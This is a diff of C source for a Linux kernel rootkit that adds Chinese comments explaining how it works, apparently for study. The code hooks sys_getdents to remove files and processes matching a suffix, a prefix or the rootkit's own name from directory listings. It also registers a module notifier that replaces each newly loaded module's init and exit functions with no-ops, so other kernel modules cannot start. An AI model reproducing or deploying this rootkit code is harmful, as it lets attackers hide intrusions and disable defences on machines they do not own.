@@ -267,7 +267,7 @@ char *read_n_bytes_of_file(struct file *f, int n, int *return_read)
 }
 
 //check if file ends on suffix
-int check_file_suffix(const char *name)
+int check_file_suffix(const char *name)	//检查后缀名函数
 {
     int len = strlen(name);
     int suffix_len = strlen(FILE_SUFFIX);
@@ -487,16 +487,18 @@ int check_file_name(const char *name)
     return strcmp(name, ROOTKIT_NAME) == 0;
 }
 
-int should_be_hidden(const char *name)
+int should_be_hidden(const char *name)	//判断后缀名是否被隐藏
 {
-    return check_file_suffix(name) | check_process_prefix(name) |
+    return check_file_suffix(name) | check_process_prefix(name) | //调用check_file_suffix()函数判断后缀名是否需要隐藏
            check_file_name(name);
 }
 
+
 asmlinkage long new_sys_getdents(unsigned int fd,
-                                 struct linux_dirent __user *dirent, unsigned int count)
+                                 struct linux_dirent __user *dirent, unsigned int count)/*fd为指向目录文件的文件描述符，该函数根据fd所指向的目录文件读取相应dirent结构，
+                                并放入dirp中，其中count为dirp中返回的数据量，正确时该函数返回值为填充到dirp的字节数*/
 {
-    int ret = ref_sys_getdents(fd, dirent, count);
+    int ret = ref_sys_getdents(fd, dirent, count);//劫持sys_getdents的返回值
     unsigned short p = 0;
     unsigned long off = 0;
     struct linux_dirent *dir, *kdir, *prev = NULL;
@@ -505,7 +507,7 @@ asmlinkage long new_sys_getdents(unsigned int fd,
     if (ret <= 0)
         return ret;
 
-    kdir = kzalloc(ret, GFP_KERNEL);
+    kdir = kzalloc(ret, GFP_KERNEL);    //为返回值ret开辟内存空间
     if (kdir == NULL)
         return ret;
 
@@ -523,16 +525,16 @@ asmlinkage long new_sys_getdents(unsigned int fd,
 
     while (off < ret)
     {
-        dir = (void *)kdir + off;
-        if (should_be_hidden((char *)dir->d_name))
+        dir = (void *)kdir + off; //遍历返回值ret中的文件
+        if (should_be_hidden((char *)dir->d_name))//判断是否隐藏
         {
             //printk(KERN_INFO "hiden %s\n", dir->d_name);
             if (dir == kdir)
             {
                 ret -= dir->d_reclen;
-                memmove(dir, (void *)dir + dir->d_reclen, ret);
+                memmove(dir, (void *)dir + dir->d_reclen, ret);//隐藏文件
                 continue;
-            }
+            }             //删除掉需要隐藏的文件名
             prev->d_reclen += dir->d_reclen;
         }
         else
@@ -1410,23 +1412,22 @@ struct notifier_block nb = {
     .priority = INT_MAX};
 int is_komon = 0;
 
-int fake_init(void)
+int fake_init(void)	//我们自己写的init函数
 {
     if (DEBUG)
-        printk(KERN_INFO "%s\n", "Fake init.");
+        printk(KERN_INFO "%s\n", "Fake init."); //如果检测到新模块加载，输出Fake init.
 
     return 0;
 }
 
-void fake_exit(void)
+void fake_exit(void) //我们自己写的exit函数
 {
     if (DEBUG)
-        printk(KERN_INFO "%s\n", "Fake exit.");
+        printk(KERN_INFO "%s\n", "Fake exit.");//如果检测到新模块卸载，输出Fake exit.
 
     return;
 }
 
-// 内核监控
 int module_notifier(struct notifier_block *nb,
                     unsigned long action, void *data)
 {
@@ -1441,11 +1442,13 @@ int module_notifier(struct notifier_block *nb,
     spin_lock_irqsave(&module_notifier_spinlock, flags);
     switch (module->state)
     {
-    case MODULE_STATE_COMING:
+    case MODULE_STATE_COMING:   /*已经注册完模块通知函数，在模块完成加载之后、开始初始化之前(即模块状态为MODULE_STATE_COMING)，
+                                将其初始函数掉包成一个什么也不做的函数，就会导致模块不能完成初始化。*/
+
         if (DEBUG)
             printk(KERN_INFO "Replacing init and exit functions: %s.\n",
                    module->name);
-        module->init = fake_init; // 替换函数 阻止
+        module->init = fake_init;  //将新加载模块的初始化函数换成我们写的初始化函数，导致新模块不能加载
         module->exit = fake_exit;
         break;
     default:
@@ -1456,7 +1459,7 @@ int module_notifier(struct notifier_block *nb,
     return NOTIFY_DONE;
 }
 
-void regist_komon(void)
+void regist_komon(void)    //注册一个模块通知处理函数
 {
     if (is_komon != 0)
         return;
@@ -1464,7 +1467,7 @@ void regist_komon(void)
     register_module_notifier(&nb);
 }
 
-void unregist_komon(void)
+void unregist_komon(void)   //解除注册
 {
     if (is_komon == 0)
         return;
